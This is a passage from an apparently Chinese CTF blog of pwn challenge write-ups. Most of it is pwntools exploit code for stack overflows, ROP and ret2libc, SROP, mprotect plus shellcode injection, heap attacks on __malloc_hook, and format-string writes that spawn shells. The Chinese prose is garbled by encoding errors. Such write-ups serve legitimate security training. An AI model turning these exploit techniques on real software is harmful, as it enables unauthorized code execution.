class="hljs-number">0x50</span>+<span class="hljs-number">8</span>)payload += p64(rdi_ret)+p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(main)p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))p.recvuntil(<span class="hljs-string">"@\n"</span>)addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))ls(<span class="hljs-string">"libc start main"</span>,addr)libc.address = addr-libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc.address)payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x58</span>payload +=  p64(rdi_ret)+p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())+p64(ret)+p64(libc.symbols[<span class="hljs-string">'system'</span>])p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))p.interactive()</code></pre><h2 id="0x05-ciscn-2019-n-1">0x05:ciscn_2019_n_1<a class="post-anchor" href="#0x05-ciscn-2019-n-1"></a></h2><pre><code class="hljs python">sys = <span class="hljs-number">0x00004006BE</span>ret = <span class="hljs-number">0x0000000000400501</span>p.sendlineafter(<span class="hljs-string">"number."</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x38</span>+p64(sys))</code></pre><h2 id="0x06-ciscn-2019-en-2">0x06:ciscn_2019_en_2<a class="post-anchor" href="#0x06-ciscn-2019-en-2"></a></h2><p>åŒ ciscn_2019_c_1</p><h2 id="0x07-ciscn-2019-n-8">0x07:ciscn_2019_n_8<a class="post-anchor" href="#0x07-ciscn-2019-n-8"></a></h2><pre><code class="hljs python">payload = <span class="hljs-string">"\x11"</span> * <span class="hljs-number">0x35</span>p.sendline(payload)</code></pre><h2 id="0x08-ciscn-s-3">0x08:ciscn_s_3<a class="post-anchor" href="#0x08-ciscn-s-3"></a></h2><p>SROP</p><pre><code class="hljs python">rt_sigreturn = <span class="hljs-number">0x4004DA</span>      <span class="hljs-comment">#mov rax 15;ret</span>read_write_ret = <span class="hljs-number">0x4004F1</span>    <span class="hljs-comment">#sys_read;sys_write;ret</span>syscall = <span class="hljs-number">0x400517</span>           <span class="hljs-comment">#syscall;ret</span>payload = <span class="hljs-string">'/bin/sh\x00'</span>.ljust(<span class="hljs-number">16</span>,<span class="hljs-string">"a"</span>) + p64(read_write_ret)gdb.attach(p)raw_input(<span class="hljs-string">"#"</span>)p.send(payload)p.recv(<span class="hljs-number">32</span>)binsh_addr = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-number">-0x118</span>p.recv(<span class="hljs-number">8</span>)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = binsh_addrframe.rsi = <span class="hljs-number">0</span>frame.rdx = <span class="hljs-number">0</span>frame.rsp = binsh_addrframe.rip = syscallraw_input(<span class="hljs-string">'#'</span>)payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(rt_sigreturn)+p64(syscall)+str(frame)p.send(payload)</code></pre><h2 id="0x09-ciscn-2019-n-3">0x09:ciscn_2019_n_3<a class="post-anchor" href="#0x09-ciscn-2019-n-3"></a></h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(idx,typer,length,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(typer))<span class="hljs-keyword">if</span> typer == <span class="hljs-number">1</span>:p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(content))<span class="hljs-keyword">else</span>:p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(length))p.recvuntil(<span class="hljs-string">"&gt; "</span>)<span class="hljs-keyword">if</span> len(content) == length<span class="hljs-number">-1</span>:p.send(content)<span class="hljs-keyword">else</span>:p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">3</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">"a"</span>)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"a"</span>)new(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">'bash'</span>+p32(elf.plt[<span class="hljs-string">'system'</span>]))new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"/bin/sh\x00"</span>)free(<span class="hljs-number">1</span>)gdb.attach(p)p.interactive()</code></pre><h2 id="0x0A-OGeek2019-babyrop">0x0A:[OGeek2019]babyrop<a class="post-anchor" href="#0x0A-OGeek2019-babyrop"></a></h2><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> buf; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span>  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+Bh] [ebp-Dh]</span>  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span>  sub_80486BB();  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> ( fd &gt; <span class="hljs-number">0</span> )    read(fd, &amp;buf, <span class="hljs-number">4u</span>);  v2 = sub_804871F(buf);  sub_80487D0(v2);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</code></pre><p>ä½¿ç”¨ \x00 æˆªæ–­ strncmp</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">sub_804871F</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span>&#123;  <span class="hljs-keyword">size_t</span> v1; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-4Ch]</span>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-2Ch]</span>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// [esp+33h] [ebp-25h]</span>  <span class="hljs-keyword">ssize_t</span> v6; <span class="hljs-comment">// [esp+4Ch] [ebp-Ch]</span>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"%ld"</span>, a1);  v6 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x20</span>u);  buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;  v1 = <span class="hljs-built_in">strlen</span>(buf);  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strncmp</span>(buf, &amp;s, v1) )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  write(<span class="hljs-number">1</span>, <span class="hljs-string">"Correct\n"</span>, <span class="hljs-number">8u</span>);  <span class="hljs-keyword">return</span> v5;&#125;</code></pre><p>ç„¶åå°±æ˜¯æ­£å¸¸çš„rop</p><pre><code class="hljs python">main = <span class="hljs-number">0x8048825</span>payload= <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'\xff'</span>*<span class="hljs-number">7</span>p.sendline(payload)p.recvuntil(<span class="hljs-string">"Correct\n"</span>)payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">'bbbb'</span>payload += p32(elf.plt[<span class="hljs-string">'puts'</span>])+p32(main)+p32(elf.got[<span class="hljs-string">'puts'</span>])p.sendline(payload)libc.address = u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">"\x00"</span>))-libc.symbols[<span class="hljs-string">'puts'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc.address)payload= <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'\xff'</span>*<span class="hljs-number">7</span>p.sendline(payload)p.recvuntil(<span class="hljs-string">"Correct\n"</span>)payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">'bbbb'</span>payload += p32(libc.symbols[<span class="hljs-string">'system'</span>])+p32(<span class="hljs-number">0x11</span>)+p32(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())p.sendline(payload)<span class="hljs-comment"># gdb.attach(p)</span><span class="hljs-comment"># p.sendline("cat flag &gt;&amp;0")</span>p.interactive()</code></pre><h2 id="0x0B-get-started-3dsctf-2016">0x0B:get_started_3dsctf_2016<a class="post-anchor" href="#0x0B-get-started-3dsctf-2016"></a></h2><pre><code class="hljs python">pop3_ret = <span class="hljs-number">0x804951D</span><span class="hljs-string">'''pop esipop edipop ebp'''</span>mem_addr = <span class="hljs-number">0x80EB000</span> <span class="hljs-comment">#å¯è¯»å¯å†™çš„å†…å­˜,ä½†ä¸å¯æ‰§è¡Œ</span>mem_size = <span class="hljs-number">0x1000</span>    <span class="hljs-comment">#é€šè¿‡è°ƒè¯•å‡ºæ¥çš„å€¼</span>mem_proc = <span class="hljs-number">0x7</span>       <span class="hljs-comment">#å¯ä»£è¡¨å¯è¯»å¯å†™å¯æ‰§è¡Œ</span>mprotect_addr = elf.symbols[<span class="hljs-string">'mprotect'</span>]read_addr = elf.symbols[<span class="hljs-string">'read'</span>]<span class="hljs-string">'''ä¸ºäº†è¿ç»­åœ¨å †æ ˆä¸­æ‰§è¡Œ,å°±æ˜¯ç”¨pop3_retæ¥æ§åˆ¶esp,ä½¿å®ƒå¾€ä¸‹å¼¹æ‰å·²ç”¨çš„3ä¸ªå€¼.'''</span>payload_01 = <span class="hljs-string">'A'</span> * <span class="hljs-number">0x38</span>payload_01 += p32(mprotect_addr)payload_01 += p32(pop3_ret) <span class="hljs-comment">#æ‰§è¡Œå®Œmprotectçš„è¿”å›åœ°å€,ä½¿espå¾€ä¸‹+12</span><span class="hljs-comment">#mprotect çš„ä¸‰ä¸ªå‚æ•°</span>payload_01 += p32(mem_addr)   <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°1 ä¿®æ”¹çš„å†…å­˜åœ°å€</span>payload_01 += p32(mem_size)   <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°2 ä¿®æ”¹çš„å†…å­˜å¤§å°</span>payload_01 += p32(mem_proc)   <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°3 ä¿®æ”¹çš„æƒé™</span>payload_01 += p32(read_addr) <span class="hljs-comment">#æ‰§è¡Œå®Œpop3_retåå¼¹åˆ°readåœ°å€</span>payload_01 += p32(pop3_ret)  <span class="hljs-comment">#æ‰§è¡Œå®Œreadåå°†è¿”å›åˆ°pop3_retæŒ‡ä»¤,åˆç»§ç»­ä½¿esp+12</span><span class="hljs-comment">#read çš„ä¸‰ä¸ªå‚æ•°</span>payload_01 += p32(<span class="hljs-number">0</span>)     <span class="hljs-comment">#readå‡½æ•°å‚æ•°1 ,ä»è¾“å…¥ç«¯è¯»å–</span>payload_01 += p32(mem_addr)   <span class="hljs-comment">#è¯»å–åˆ°çš„å†…å®¹å¤åˆ¶åˆ°æŒ‡å‘çš„å†…å­˜é‡Œ</span>payload_01 += p32(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#è¯»å–å¤§å°</span>payload_01 += p32(mem_addr)   <span class="hljs-comment">#æ‰§è¡Œå®Œreadåret esi</span>p.sendline(payload_01)payload_sh = asm(shellcraft.sh(),arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>) p.sendline(payload_sh)</code></pre><p><a href="https://www.cnblogs.com/lyxf/p/12113401.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><p>å†…å­˜çš„æƒé™ä¿®æ”¹</p><blockquote><p>1.æ ˆæº¢å‡ºret åˆ° mprotectå‡½æ•°åœ°å€,æˆ‘æ¥è§£é‡Šä¸€ä¸‹ call æŒ‡ä»¤, call = push + jmp<br>æ‰€ä»¥ç›´æ¥retåè¦ç•™ä¸€ä¸ªè¿”å›åœ°å€,å› ä¸ºret å°±ç›¸å½“äº jmp åˆ° mprotect,ä¸ºäº†å®Œæ•´çš„å›æ¥,æ‰€ä»¥åœ¨<br>mprotectåœ°å€ååœ¨å‹å…¥ä¸€ä¸ªè¿”å›åœ°å€.<br>2.åœ¨32ä¸ºç³»ç»Ÿä¸­ä¼ å‚æ˜¯ä½¿ç”¨æ ˆä¼ å‚,æ‹©ç¬¬ä¸€ä¸ªå‚æ•°å…ˆpush,ç¬¬äºŒä¸ªå†pushâ€¦.<br>æ‰€ä»¥åŸºæœ¬çš„payloadå¯ä»¥æ„æ€å¦‚ä¸‹:<br>payload = â€˜Aâ€™ + 0x38 + p32(mprotect_addr)<br>payload += p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)</p><p>è¿™é‡Œçš„mprotect_addrå°±æ˜¯æˆ‘ä»¬è¦è·³è½¬åˆ°mprotectå‡½æ•°çš„åœ°å€<br>ret_addr ä¸º mprotectå‡½æ•°æ‰§è¡Œå®Œåçš„åœ°å€.<br>argu1 ä¸ºmprotectå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° (è¢«ä¿®æ”¹å†…å­˜çš„åœ°å€) è®¾ç½®ä¸º 0x0x80EB000 (edb-debugeræŸ¥çœ‹å¾—åˆ°)<br>argu2 ä¸ºmprotectå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° (è¢«ä¿®æ”¹å†…å­˜çš„å¤§å°) è®¾ç½®ä¸º 0x1000 (0x1000é€šè¿‡ç¨‹åºå¯åŠ¨æ—¶æŸ¥çœ‹è¯¥å†…å­˜å—çš„å¤§å°çš„åˆ°çš„)<br>argu3 ä¸ºmprotectå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° (è¢«ä¿®æ”¹å†…å­˜çš„æƒé™) è®¾ç½®ä¸º 7 = 4 + 2 +1 (rwx)</p><p>ä¸ºäº†åç»­å†èƒ½ä½¿ç”¨æ ˆret,æˆ‘ä»¬çš„æ„é€ ä¸€ä¸‹æ ˆçš„å¸ƒå±€,å› ä¸ºmprotectå‡½æ•°ä½¿ç”¨åˆ°äº†3ä¸ªå‚æ•°,æˆ‘ä»¬å°±æ‰¾å­˜åœ¨3ä¸ªè¿ç»­popçš„æŒ‡ä»¤<br>ä¸ºå•¥è¦æ‰¾3ä¸ªpop,ä¹Ÿå°±æ˜¯åœ¨æ­£å¸¸æƒ…å†µä¸‹,å‡½æ•°ä¼ å‚æ˜¯ä½¿ç”¨pushï¼Œæ‰€ä»¥è¦ä¸ºäº†å †æ ˆè¿˜åŸ,å‡½æ•°è°ƒç”¨ç»“æŸæ—¶å°±ä½¿ç”¨popæ¥ä¿è¯å †æ ˆ<br>å®Œå¥½.</p><p>ä½¿ç”¨ ROPgadget â€“binary get_started_3dsctf_2016 â€“only â€˜pop|retâ€™ | grep pop<br>å­˜åœ¨popçš„ä¸€äº›æŒ‡ä»¤åœ°å€,å¯ä»¥å‘ç°:<br>0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret<br>é‚£æˆ‘ä»¬å°±å¾—åˆ°äº†è¯¥åœ°å€.<br>ä¸Šé¢çš„ret_addrå°±å¡«å†™0x0804f460<br>è€Œç°åœ¨çš„payloadå°±å¯ä»¥ä¸º:<br>payload = â€˜Aâ€™ + 0x38 + p32(mprotect_addr)<br>payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)<br>payload += p32(ret_addr2)</p><p>ret_addr2 å³ä¸ºæ‰§è¡Œå®Œmprotectå‡½æ•°å³å¼¹å‡ºæ ˆåçš„è¿”å›åœ°å€.æˆ‘ä»¬ä¹Ÿå°±å¯ä»¥å†æ¬¡åˆ©ç”¨æ ˆçš„retæ¥æ§åˆ¶eip,<br>å³ä¸ºä¸‹ä¸€ä¸ªå‡½æ•°readçš„åœ°å€.</p></blockquote><p>å†…å­˜å†™å…¥shellcode</p><blockquote><p>readå‡½æ•°åŸå‹:<br>ssize_t read(int fd, void *buf, size_t count);<br>fd è®¾ä¸º0æ—¶å°±å¯ä»¥ä»è¾“å…¥ç«¯è¯»å–å†…å®¹    è®¾ä¸º0<br>buf è®¾ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å†…å­˜åœ°å€     è®¾ä¸ºæˆ‘ä»¬å·²æ‰¾åˆ°çš„å†…å­˜åœ°å€0x80EB000<br>size é€‚å½“å¤§å°å°±å¯ä»¥              è®¾ä¸º0x100å°±å¯ä»¥äº†</p><p>ç°åœ¨çš„payloadä¹Ÿå°±å¯ä»¥æ„é€ å¦‚ä¸‹<br>payload = â€˜Aâ€™ + 0x38 + p32(mprotect_addr)<br>payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)<br>payload += p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)<br>readå‡½æ•°ä¹Ÿè·Ÿmprotectä¸€æ ·çš„ä¾‹å­,å°±æ˜¯ call = push + jmp.<br>read_addr åé¢çš„ä¸€ä¸ªret_addr2å°±æ˜¯æ‰§è¡Œå®Œreadå‡½æ•°åçš„è¿”å›åœ°å€.å†æ¬¡ä½¿ç”¨pop3_retå¼¹æ‰3ä¸ªå·²ç”¨çš„å‚æ•°,æ¥ç€è¿˜å¯<br>ä»¥åˆ©ç”¨æ ˆretæ¥æ§åˆ¶eipè·³è½¬åˆ°mem_addræ‰§è¡Œè‡ªå·±çš„shellcode, payloadå¦‚ä¸‹.</p><p>payload = â€˜Aâ€™ + 0x38 + p32(mprotect_addr)<br>payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)<br>payload += p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)<br>payload += p32(mem_addr)</p><p>ç„¶è€Œåœ¨æ‰§è¡Œreadå‡½æ•°æ—¶å°±å¯ä»¥è¾“å…¥shellcode,å³payload2ä¸º:<br>payload_sh = asm(shellcraft.sh(),arch = â€˜i386â€™, os = â€˜linuxâ€™)</p></blockquote><h2 id="0x0C-babyheap-0ctf-2017">0x0C:babyheap_0ctf_2017<a class="post-anchor" href="#0x0C-babyheap-0ctf-2017"></a></h2><p>ä¿æŠ¤å…¨å¼€</p><p>ç¨‹åºä½¿ç”¨callocè¿›è¡Œå †çš„åˆ†é…ã€‚callocåŒmallocç±»ä¼¼åªæ˜¯ä¼šå°†ç”³è¯·åˆ°çš„å †å—å†…å®¹æ¸…0ã€‚æ‰€ä»¥å¸¸è§„çš„unsorted binä¿¡æ¯æ³„éœ²çš„æ–¹å¼ä¸å¯è¡Œã€‚</p><p>Fill å‡½æ•°ä¼ å…¥çš„ size å¯æ§ é€ æˆå †æº¢å‡ºã€‚</p><h2 id="Leak-libc">Leak libc<a class="post-anchor" href="#Leak-libc"></a></h2><pre><code class="hljs python"><span class="hljs-comment"># leak libc</span>malloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#0</span>malloc(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#1</span>fill(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))malloc(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#2</span>fill(<span class="hljs-number">2</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))free(<span class="hljs-number">1</span>)malloc(<span class="hljs-number">0x60</span>)fill(<span class="hljs-number">1</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x30</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>))malloc(<span class="hljs-number">0x60</span>)free(<span class="hljs-number">2</span>)show(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">"\x11\x01"</span>+<span class="hljs-string">"\x00"</span>*<span class="hljs-number">6</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)</code></pre><p>åˆ©ç”¨å †å—é‡å æ¥ leak unsorted binâ€™s fd</p><pre><code class="hljs python"><span class="hljs-comment"># leak libc</span>malloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#0</span>malloc(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#1</span>fill(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))malloc(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#2</span>fill(<span class="hljs-number">2</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))free(<span class="hljs-number">1</span>)malloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span>fill(<span class="hljs-number">1</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x30</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>))malloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span>free(<span class="hljs-number">2</span>)show(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">"\x11\x01"</span>+<span class="hljs-string">"\x00"</span>*<span class="hljs-number">6</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)<span class="hljs-comment"># modify malloc_hook to one_gadget</span>malloc(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#2</span>malloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span>free(<span class="hljs-number">3</span>)fill(<span class="hljs-number">2</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(libc.symbols[<span class="hljs-string">"__malloc_hook"</span>]<span class="hljs-number">-0x23</span>))malloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span>malloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#5</span>fill(<span class="hljs-number">5</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc.address+<span class="hljs-number">0x4526a</span>))malloc(<span class="hljs-number">0x100</span>)</code></pre><h1 id="0x0D-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5">0x0D:[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5<a class="post-anchor" href="#0x0D-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"></a></h1><p><code>p.sendline(p32(0x0804C044) + &quot;%10$n&quot;)p.sendline(&quot;4&quot;)</code></p><h1 id="0x0E-not-the-same-3dsctf-2016">0x0E:not_the_same_3dsctf_2016<a class="post-anchor" href="#0x0E-not-the-same-3dsctf-2016"></a></h1><p>statically linked é¢˜ç›®</p><pre><code class="hljs python">pop3_ret = <span class="hljs-number">0x0809e3e5</span>offset = <span class="hljs-number">45</span>payload = offset * <span class="hljs-string">"a"</span>payload += p32(elf.symbols[<span class="hljs-string">'mprotect'</span>]) + p32(pop3_ret)payload += p32(<span class="hljs-number">0x080EB000</span>) + p32(<span class="hljs-number">0x1000</span>) + p32(<span class="hljs-number">7</span>)payload += p32(elf.symbols[<span class="hljs-string">'read'</span>]) + p32(pop3_ret)payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x080EBF81</span>) + p32(<span class="hljs-number">0x100</span>) + p32(<span class="hljs-number">0x080EBF81</span>)p.sendline(payload)payload = asm(shellcraft.sh())sleep(<span class="hljs-number">1</span>)p.sendline(payload)</code></pre><h1 id="0x0F-babyfengshui-33c3-2016">0x0F:babyfengshui_33c3_2016<a class="post-anchor" href="#0x0F-babyfengshui-33c3-2016"></a></h1><h1 id="0x10-HarekazeCTF2019-baby-rop">0x10:[HarekazeCTF2019]baby_rop<a class="post-anchor" href="#0x10-HarekazeCTF2019-baby-rop"></a></h1><pre><code class="hljs python">rdi_ret = <span class="hljs-number">0x0000000000400683</span>payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)payload += p64(rdi_ret)+p64(elf.search(<span class="hljs-string">'/bin/sh'</span>).next())+p64(elf.plt[<span class="hljs-string">'system'</span>])p.sendlineafter(<span class="hljs-string">"? "</span>,payload)</code></pre><h1 id="0x11-HarekazeCTF2019-baby-rop2">0x11:[HarekazeCTF2019]baby_rop2<a class="post-anchor" href="#0x11-HarekazeCTF2019-baby-rop2"></a></h1><pre><code class="hljs python">rdi_ret = <span class="hljs-number">0x0000000000400733</span>rsi_r15_ret = <span class="hljs-number">0x0000000000400731</span>ret = <span class="hljs-number">0x00000000004004d1</span>main = <span class="hljs-number">0x000000000400636</span>buf_addr = elf.bss(<span class="hljs-number">0x500</span>)ls(<span class="hljs-string">"buf addr"</span>,buf_addr)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)payload += p64(rdi_ret)+p64(<span class="hljs-number">0x400790</span>)payload += p64(rsi_r15_ret)+p64(elf.got[<span class="hljs-string">'read'</span>])+p64(<span class="hljs-number">0</span>)payload += p64(elf.plt[<span class="hljs-string">'printf'</span>])<span class="hljs-comment"># payload += p64(ret)</span>payload += p64(main)p.sendlineafter(<span class="hljs-string">"? "</span>,payload)read_addr=u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))ls(<span class="hljs-string">"read addr"</span>,read_addr)libc.address = read_addr - <span class="hljs-number">0x0f7250</span><span class="hljs-comment">#libc.symbols['read']</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)payload += p64(rdi_ret) + p64(libc.address + <span class="hljs-number">0x18cd57</span>)payload += p64(libc.address+<span class="hljs-number">0x045390</span>)p.sendline(payload)</code></pre><h1 id="0x12-pwn2-sctf-2016">0x12:pwn2_sctf_2016<a class="post-anchor" href="#0x12-pwn2-sctf-2016"></a></h1><pre><code class="hljs python">back_door = <span class="hljs-number">0x080484CD</span>fmt = <span class="hljs-number">0x080486F8</span>main = <span class="hljs-number">0x080485B8</span>p.sendline(<span class="hljs-string">"-1"</span>)p.recvuntil(<span class="hljs-string">"!\n"</span>)payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">4</span>)payload += p32(elf.plt[<span class="hljs-string">'printf'</span>])payload += p32(main)payload += p32(fmt)payload += p32(elf.got[<span class="hljs-string">'atoi'</span>])p.sendline(payload)p.recvuntil(<span class="hljs-string">"\x04\x08\x0aYou said: "</span>)libc.address = u32(p.recvuntil(<span class="hljs-string">"\xf7"</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-number">-0x02d050</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)p.sendline(<span class="hljs-string">"-1"</span>)p.recvuntil(<span class="hljs-string">"!\n"</span>)payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">4</span>)payload += p32(libc.address+<span class="hljs-number">0x03a940</span>)payload += p32(main)payload += p32(libc.address+<span class="hljs-number">0x15902b</span>)p.sendline(payload)</code></pre><h1 id="0x13-ez-pz-hackover-2016">0x13:ez_pz_hackover_2016<a class="post-anchor" href="#0x13-ez-pz-hackover-2016"></a></h1><pre><code class="hljs python">main = <span class="hljs-number">0x08048603</span>fmt = <span class="hljs-number">0x08048845</span>p.recvuntil(<span class="hljs-string">"Yippie, lets crash: 0x"</span>)ret_addr = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)ls(<span class="hljs-string">"str addr"</span>,ret_addr)<span class="hljs-comment"># gdb.attach(p)</span><span class="hljs-comment"># stop()</span>payload = <span class="hljs-string">'crashme\x00'</span> + <span class="hljs-string">'\xAA'</span> * <span class="hljs-number">18</span>payload += p32(ret_addr)payload += <span class="hljs-string">"\x90"</span> * 